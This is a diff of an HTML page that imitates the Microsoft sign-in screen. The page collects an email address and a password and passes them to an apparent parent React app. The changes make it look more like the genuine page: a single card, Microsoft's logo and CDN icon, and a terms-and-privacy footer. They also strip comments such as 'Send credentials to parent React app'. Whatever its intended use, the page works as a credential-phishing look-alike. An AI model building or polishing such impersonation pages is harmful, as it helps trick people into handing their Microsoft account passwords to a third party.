@@ -5,7 +5,7 @@
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
-    /* Base Styles - Unchanged */
+    /* Base Styles */
     body, html {
       height: 100%;
       margin: 0;
@@ -14,48 +14,51 @@
       display: flex;
       align-items: center;
       justify-content: center;
+      -webkit-font-smoothing: antialiased;
+      -moz-osx-font-smoothing: grayscale;
     }
     
-    /* Card Container - Width increased */
-    .card-container {
+    /* Main Card Container */
+    .container {
       width: 100%;
-      max-width: 880px; /* Doubled from 440px */
-    }
-
-    /* Main Login Card - Unchanged */
-    .login-card {
+      max-width: 440px;
       background-color: #ffffff;
-      padding: 44px 44px 50px 44px;
       box-shadow: 0 2px 10px rgba(0,0,0,0.1);
     }
+
+    .form-content {
+      padding: 44px;
+    }
     
-    .login-card img.logo {
+    /* Logo and Text Styling */
+    img.logo {
       height: 23px;
       margin-bottom: 24px;
     }
     
-    .login-card h1 {
+    h1 {
       font-size: 24px;
       font-weight: 600;
       margin: 0 0 28px 0;
       color: #1b1b1b;
     }
     
-    .login-card p {
+    p {
       font-size: 13px;
       margin-top: 24px;
       margin-bottom: 0;
     }
     
-    .login-card a {
+    a {
       color: #0067b8;
       text-decoration: none;
     }
     
-    .login-card a:hover {
+    a:hover {
       text-decoration: underline;
     }
 
+    /* Form Elements */
     .form-control {
       width: 100%;
       border: none;
@@ -89,50 +92,53 @@
       background-color: #005a9e;
     }
 
-    /* Sign-in Options Card - Unchanged */
-    .options-card {
-      background-color: #ffffff;
-      box-shadow: 0 2px 10px rgba(0,0,0,0.1);
-      margin-top: 24px;
-      padding: 16px 44px;
+    /* Sign-in Options Section (Inside Card) */
+    .options-section {
+      border-top: 1px solid #e5e5e5;
+      padding: 24px 44px;
       cursor: pointer;
     }
 
-    .options-card:hover {
+    .options-section:hover {
       background-color: #f9f9f9;
     }
 
-    .options-card a {
+    .options-section a {
       color: #1b1b1b;
+      font-size: 15px;
       text-decoration: none;
       display: flex;
       align-items: center;
     }
 
-    /* Key Icon - Unchanged */
-    .options-card img.key-icon {
-        width: 28px;
-        height: 28px;
-        margin-right: 16px;
+    img.key-icon {
+      width: 28px;
+      height: 28px;
+      margin-right: 16px;
+    }
+    
+    /* Footer */
+    .footer {
+      position: fixed;
+      bottom: 24px;
+      right: 24px;
+      font-size: 12px;
+    }
+    .footer a {
+      color: #333;
+      margin-left: 16px;
     }
 
     /* Utility and Logic Styles - Unchanged */
-    .hidden {
-      display: none !important;
-    }
-    
-    #error-message {
-      color: #a80000;
-      font-size: 13px;
-      margin-bottom: 16px;
-    }
+    .hidden { display: none !important; }
+    #error-message { color: #a80000; font-size: 13px; margin-bottom: 16px; }
   </style>
 </head>
 <body>
 
-  <div class="card-container">
-    <!-- Main Login Card -->
-    <div class="login-card">
+  <div class="container">
+    <div class="form-content">
+      <!-- Email View -->
       <div id="email_view">
         <img src="https://upload.wikimedia.org/wikipedia/commons/9/96/Microsoft_logo_%282012%29.svg" alt="Microsoft logo" class="logo">
         <h1>Sign in</h1>
@@ -144,6 +150,7 @@
           <button class="btn-primary-blue" id="next_btn">Next</button>
         </div>
       </div>
+      <!-- Password View -->
       <div id="password_view" class="hidden">
         <img src="https://upload.wikimedia.org/wikipedia/commons/9/96/Microsoft_logo_%282012%29.svg" alt="Microsoft logo" class="logo">
         <p id="user_email_display" style="margin-top: 0; margin-bottom: 16px;"></p>
@@ -156,14 +163,19 @@
         </div>
       </div>
     </div>
-    
-    <!-- Sign-in Options Card -->
-    <div class="options-card">
+    <!-- Sign-in Options Section -->
+    <div class="options-section">
       <a href="#">
         <img src="https://aadcdn.msauth.net/shared/1.0/content/images/signin-options_3e3f6b73c3f310c31d2c4d131a8ab8c6.svg" alt="Sign-in options" class="key-icon">
         <span>Sign-in options</span>
       </a>
     </div>
+  </div>
+
+  <div class="footer">
+    <a href="#">Terms of use</a>
+    <a href="#">Privacy & cookies</a>
+    <a href="#">...</a>
   </div>
 
   <!-- JavaScript Logic - Unchanged -->
@@ -179,7 +191,6 @@
       const userEmailDisplay = document.getElementById('user_email_display');
       let userEmail = '';
 
-      // Listen for error messages from the parent React app
       window.addEventListener('message', function (event) {
         if (event.data.type === 'LOGIN_ERROR') {
           const errorMessage = event.data.payload.message;
@@ -189,7 +200,6 @@
         }
       });
 
-      // Show password view
       nextBtn.addEventListener('click', function () {
         if (emailInput.value.trim() !== '') {
           userEmail = emailInput.value.trim();
@@ -200,7 +210,6 @@
         }
       });
 
-      // Send credentials to parent React app
       signinBtn.addEventListener('click', function () {
         const password = passwordInput.value.trim();
         passwordErrorContainer.innerHTML = '';
